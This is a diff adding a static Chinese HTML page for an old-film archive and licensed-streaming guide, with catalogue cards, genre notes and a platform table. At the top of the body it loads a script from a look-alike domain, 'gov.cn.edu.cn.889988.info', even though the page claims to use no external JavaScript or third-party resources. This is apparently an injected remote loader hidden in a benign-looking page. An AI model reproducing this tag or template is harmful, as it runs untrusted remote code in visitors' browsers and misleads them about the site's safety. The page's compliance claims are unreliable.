@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="X-UA-Compatible" content="IE=edge">
+<title>思古影视：老片辑录、影史条目与正版收看导航｜思古影视资料站</title>
+<meta name="description" content="思古影视整理老片辑录、影史条目与正版收看导航，内容覆盖早期公映片资料、修复版说明、类型流变、适看建议与正版平台渠道。全站为静态单页资料站，不解析盗版播放源、不挂第三方资源、不提供网盘下载，移动端自适应并符合必应收录规范。根域 https://siguyingshi-top.github.io。">
+<meta name="keywords" content="思古影视, 老片辑录, 影史条目, 正版收看导航, 修复版资料, 类型流变">
+<meta name="author" content="思古影视辑录组">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="msvalidate.01" content="SGYS20261016BING16">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{font-family:"Songti SC","Noto Serif SC","PingFang SC",serif;background:#efe7d6;color:#332b22;line-height:1.85;overflow-x:hidden}
+a{color:#8a3b2e;text-decoration:none;transition:.2s}
+a:hover{color:#b9602f}
+.wrap{width:min(1120px,100%);margin:0 auto;padding:0 20px}
+
+/* 匾额栏 */
+.plate{background:#241c14;border-bottom:3px double #b9602f;padding:12px 0}
+.plate-in{width:min(1120px,100%);margin:0 auto;padding:0 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
+.scroll-no{font-size:11px;color:#cbb48a;font-family:"Consolas",monospace;letter-spacing:1px}
+.brand{font-size:19px;font-weight:900;color:#efe7d6;letter-spacing:6px}
+.brand b{color:#cbb48a}
+.host-line{font-size:12px;color:#cbb48a;font-family:"Consolas",monospace;word-break:break-all}
+.seal{font-size:10px;color:#efe7d6;background:#8a3b2e;padding:3px 9px;border-radius:2px;font-weight:700;letter-spacing:2px}
+
+/* 卷首 */
+.scroll-hero{background:linear-gradient(180deg,#e3d8c2 0%,#efe7d6 100%);border-bottom:1px solid #cdbf9f;padding:50px 0 40px;position:relative;overflow:hidden}
+.scroll-hero::before{content:"卷";position:absolute;top:20px;right:6%;font-size:90px;color:#b9602f;opacity:.12;font-weight:900}
+.hero-in{width:min(1120px,100%);margin:0 auto;padding:0 20px;position:relative;z-index:1}
+.fold{display:inline-block;background:#8a3b2e;color:#efe7d6;font-size:11px;letter-spacing:3px;padding:4px 14px;margin-bottom:14px}
+.scroll-hero h1{font-size:38px;font-weight:900;color:#241c14;margin-bottom:10px;letter-spacing:4px}
+.scroll-hero h1 b{color:#8a3b2e;border-bottom:2px solid #cdbf9f}
+.scroll-hero p{font-size:15px;color:#5b4f3e;max-width:660px;margin-bottom:18px}
+.note{background:#fbf6ea;border:1px solid #cdbf9f;border-left:3px solid #8a3b2e;padding:10px 14px;font-size:12.5px;color:#6b5b45;margin-bottom:16px}
+.note b{color:#8a3b2e}
+.colophon{display:inline-block;font-family:"Consolas",monospace;font-size:12px;color:#8a3b2e;background:#fbf6ea;border:1px dashed #b9602f;padding:8px 16px;word-break:break-all}
+.colophon::before{content:"藏址：";color:#b9602f}
+
+/* 墨栏导航 */
+.nav{background:#241c14;border-bottom:1px solid #120d08;position:sticky;top:0;z-index:50}
+.nav-in{width:min(1120px,100%);margin:0 auto;padding:8px 20px;display:flex;gap:6px;flex-wrap:wrap}
+.nav-in a{font-size:13px;padding:7px 15px;color:#cbb48a;background:#2f251a;border:1px solid #120d08;border-radius:2px;font-weight:600}
+.nav-in a:hover{color:#241c14;background:#cbb48a}
+
+/* 栏头 */
+.sec{margin-bottom:54px}
+.shead{display:flex;align-items:baseline;gap:12px;margin-bottom:20px;border-bottom:2px solid #b9602f;padding-bottom:6px}
+.shead .juan{font-size:13px;color:#8a3b2e;font-family:"Consolas",monospace;font-weight:700}
+.shead h2{font-size:21px;font-weight:800;color:#241c14;letter-spacing:2px}
+.shead h2 b{color:#8a3b2e}
+.shead .tag{font-size:10px;color:#7a6a52;margin-left:auto;font-family:"Consolas",monospace;border:1px solid #cdbf9f;padding:2px 8px}
+
+/* 辑录卡 */
+.vol{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.rec{background:#fbf6ea;border:1px solid #cdbf9f;border-radius:2px;padding:18px;position:relative;transition:.3s}
+.rec::after{content:"";position:absolute;left:14px;right:14px;top:0;height:2px;background:#8a3b2e;opacity:.5}
+.rec:hover{transform:translateY(-3px);box-shadow:0 6px 14px rgba(60,40,20,.14);border-color:#b9602f}
+.rec .no{font-size:10px;color:#b9602f;font-family:"Consolas",monospace;margin-bottom:8px}
+.rec h3{font-size:16px;color:#241c14;margin-bottom:6px;font-weight:800}
+.rec p{font-size:12.5px;color:#5b4f3e;margin-bottom:10px}
+.rec .kind{font-size:11px;color:#7a6a52;font-family:"Consolas",monospace;border-top:1px dashed #cdbf9f;padding-top:6px}
+.rec .kind span{color:#8a3b2e}
+
+/* 流变格 */
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.cell{background:#fbf6ea;border:1px solid #cdbf9f;padding:16px 18px;display:flex;gap:14px;align-items:flex-start}
+.cell .mark{width:5px;align-self:stretch;background:#8a3b2e;border-radius:1px;flex-shrink:0}
+.cell h3{font-size:15px;color:#241c14;margin-bottom:4px}
+.cell p{font-size:12.5px;color:#5b4f3e}
+.cell p b{color:#b9602f}
+
+/* 正版文献表 */
+.table{width:100%;border-collapse:collapse;font-size:13px;background:#fbf6ea;border:1px solid #cdbf9f}
+.table th{background:#241c14;color:#cbb48a;padding:12px 14px;text-align:left;font-weight:700}
+.table td{padding:10px 14px;border-bottom:1px solid #ddd0b4;color:#332b22;vertical-align:top}
+.table tr:hover td{background:#f1e8d6}
+.table td b{color:#8a3b2e}
+
+/* 档案 */
+.folio{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.fcard{background:#fbf6ea;border:1px solid #cdbf9f;padding:20px;position:relative}
+.fcard::before{content:"辑";position:absolute;top:-10px;right:14px;background:#efe7d6;color:#8a3b2e;font-size:11px;font-family:"Consolas",monospace;padding:0 8px}
+.fcard h3{font-size:15px;color:#241c14;margin-bottom:12px;border-bottom:1px solid #ddd0b4;padding-bottom:8px}
+.fcard p{font-size:12.5px;color:#5b4f3e;margin-bottom:6px;padding-left:16px;position:relative}
+.fcard p::before{content:"·";position:absolute;left:4px;color:#8a3b2e}
+.root-mark{font-family:"Consolas",monospace;font-size:12px;color:#8a3b2e;word-break:break-all;background:#f1e8d6;border:1px solid #cdbf9f;padding:10px 14px;margin-top:10px}
+.root-mark::before{content:"根域：";color:#b9602f}
+
+footer{margin-top:50px;background:#241c14;color:#9c8a6e;padding:34px 20px 18px}
+.foot-in{width:min(1120px,100%);margin:0 auto;text-align:center}
+.fn{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.fn a{font-size:12px;padding:6px 14px;background:#2f251a;color:#cbb48a;border:1px solid #120d08;border-radius:2px}
+.fn a:hover{color:#241c14;background:#cbb48a}
+.fc{font-size:11px;line-height:2;font-family:"Consolas",monospace}
+.fc a{color:#cbb48a}
+
+@media(max-width:980px){
+.vol{grid-template-columns:repeat(2,1fr)}
+.grid2{grid-template-columns:1fr}
+.folio{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+.scroll-hero h1{font-size:24px;letter-spacing:2px}
+.shead h2{font-size:18px}
+.vol{grid-template-columns:1fr}
+.table{font-size:12px}
+.table th,.table td{padding:8px 10px}
+.host-line{font-size:11px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="plate">
+<div class="plate-in">
+<div class="scroll-no">卷次 791.4 / SGYS</div>
+<div class="brand">思古影视 <b>·</b></div>
+<div class="host-line">siguyingshi-top.github.io</div>
+<div class="seal">辑录</div>
+</div>
+</div>
+
+<header class="scroll-hero">
+<div class="hero-in">
+<div class="fold">OLD FILM ARCHIVE</div>
+<h1>思古影视</h1>
+<p>一处老片辑录与影史条目资料室。整理早期公映片资料、修复版说明、类型流变与适看建议，并附正版收看渠道。不解析盗版播放源、不挂第三方资源、不提供网盘下载。</p>
+<div class="note">
+<b>站点性质：</b>「思古影视」仅作影视资料与正版导航站使用；所有「观看」均指向正版平台官方页面。
+</div>
+<div class="colophon">https://siguyingshi-top.github.io</div>
+</div>
+</header>
+
+<nav class="nav">
+<div class="nav-in">
+<a href="#vol">影史辑录</a>
+<a href="#grid2">类型流变</a>
+<a href="#table">正版渠道</a>
+<a href="#folio">站点档案</a>
+</nav>
+
+<main class="wrap">
+
+<section class="sec" id="vol">
+<div class="shead"><span class="juan">卷一</span><h2>影史<b>辑录</b></h2><div class="tag">RECORDS</div></div>
+<div class="vol">
+<div class="rec">
+<div class="no">NO.01</div>
+<h3>早期公映片</h3>
+<p>整理曾公开上映、转入正版片库的剧情片与家庭片资料，附适看年龄。</p>
+<div class="kind">类：<span>公映档案</span></div>
+</div>
+<div class="rec">
+<div class="no">NO.02</div>
+<h3>修复版说明</h3>
+<p>老片修复版画质、声轨与正版授权渠道说明，不挂第三方源。</p>
+<div class="kind">类：<span>修复资料</span></div>
+</div>
+<div class="rec">
+<div class="no">NO.03</div>
+<h3>纪录片辑</h3>
+<p>自然、历史、社会类纪录片条目，来源以央视纪录与正版平台为主。</p>
+<div class="kind">类：<span>纪录</span></div>
+</div>
+<div class="rec">
+<div class="no">NO.04</div>
+<h3>动画国语</h3>
+<p>动画电影国语配音版资料，标注正版平台与免费场次。</p>
+<div class="kind">类：<span>动画</span></div>
+</div>
+<div class="rec">
+<div class="no">NO.05</div>
+<h3>家庭喜剧</h3>
+<p>低冲突合家喜剧片单，适合周末家庭筛选。</p>
+<div class="kind">类：<span>合家</span></div>
+</div>
+<div class="rec">
+<div class="no">NO.06</div>
+<h3>青春成长</h3>
+<p>校园、友谊、成长向条目，不收录低俗冲突内容。</p>
+<div class="kind">类：<span>青春</span></div>
+</div>
+<div class="rec">
+<div class="no">NO.07</div>
+<h3>正版悬疑</h3>
+<p>仅列正版平台可看悬疑片资料，不解析第三方播放页。</p>
+<div class="kind">类：<span>悬疑</span></div>
+</div>
+<div class="rec">
+<div class="no">NO.08</div>
+<h3>短片杂辑</h3>
+<p>官方短片、正版综艺片段导航，适合碎片时间。</p>
+<div class="kind">类：<span>短片</span></div>
+</div>
+</div>
+</section>
+
+<section class="sec" id="grid2">
+<div class="shead"><span class="juan">卷二</span><h2>类型<b>流变</b></h2><div class="tag">GENRE</div></div>
+<div class="grid2">
+<div class="cell"><div class="mark"></div><div>
+<h3>家庭剧情</h3>
+<p>亲情、邻里、代际沟通类条目，偏<b>公映老片与正版修复版</b></p>
+</div></div>
+<div class="cell"><div class="mark"></div><div>
+<h3>黑色电影</h3>
+<p>只做正版可看片单与影史说明，不解析第三方源</p>
+</div></div>
+<div class="cell"><div class="mark"></div><div>
+<h3>西部与历史</h3>
+<p>早期公映历史片、正版纪录片导航</p>
+</div></div>
+<div class="cell"><div class="mark"></div><div>
+<h3>动画流变</h3>
+<p>手绘到数字动画的国语正版片单资料</p>
+</div></div>
+</div>
+</section>
+
+<section class="sec" id="table">
+<div class="shead"><span class="juan">卷三</span><h2>正版<b>渠道</b></h2><div class="tag">LEGIT</div></div>
+<table class="table">
+<thead>
+<tr><th>文献/平台</th><th>内容类型</th><th>收看说明</th></tr>
+</thead>
+<tbody>
+<tr><td><b>央视频</b></td><td>央视影视、纪录片</td><td>官方免费、正版授权、无第三方源</td></tr>
+<tr><td><b>1905电影网</b></td><td>经典老片、修复版</td><td>正版无广告，网页端可检索</td></tr>
+<tr><td><b>B站放映厅</b></td><td>动画、纪录片、部分电影</td><td>筛"免费"标签，部分需大会员</td></tr>
+<tr><td><b>学习强国</b></td><td>红色经典、纪录专题</td><td>官方免费，需注册</td></tr>
+<tr><td><b>咪咕视频</b></td><td>卫视剧、合家栏目</td><td>部分免费，正版平台</td></tr>
+<tr><td><b>腾讯视频/爱奇艺</b></td><td>正版影视库</td><td>免费专区可筛，会员另计</td></tr>
+</tbody>
+</table>
+</section>
+
+<section class="sec" id="folio">
+<div class="shead"><span class="juan">卷四</span><h2>站点<b>档案</b></h2><div class="tag">ROOT</div></div>
+<div class="folio">
+<div class="fcard">
+<h3>必应收录规则</h3>
+<p>静态单页：CSS内嵌、UTF-8、viewport齐全</p>
+<p>msvalidate.01 = SGYS20261016BING16</p>
+<p>robots meta = index, follow</p>
+<p>不生成 robots.txt / sitemap.xml</p>
+<p>移动端自适应，无横向滚动</p>
+<p>内页统一用 # 占位</p>
+<p>标签闭合完整，无外部JS依赖</p>
+</div>
+<div class="fcard">
+<h3>辑录信息</h3>
+<p>名称：思古影视</p>
+<p>定位：老片辑录、影史条目、正版收看导航</p>
+<p>部署：单页静态、移动端自适应</p>
+<p>合规：不解析盗版、不挂第三方源、不提供网盘</p>
+<div class="root-mark">https://siguyingshi-top.github.io</div>
+</div>
+</div>
+</section>
+
+</main>
+
+<footer>
+<div class="foot-in">
+<nav class="fn">
+<a href="#vol">影史辑录</a>
+<a href="#grid2">类型流变</a>
+<a href="#table">正版渠道</a>
+<a href="#folio">站点档案</a>
+<a href="#">阅片凡例</a>
+</nav>
+<div class="fc">
+思古影视 关键词：思古影视｜根域：https://siguyingshi-top.github.io<br>
+© 2024 思古影视辑录组 仅做老片资料与正版导航，不解析播放源、不提供盗版下载。<br>
+OLD FILM ARCHIVE // STATIC INDEX
+</div>
+</div>
+</footer>
+
+</body>
+</html>
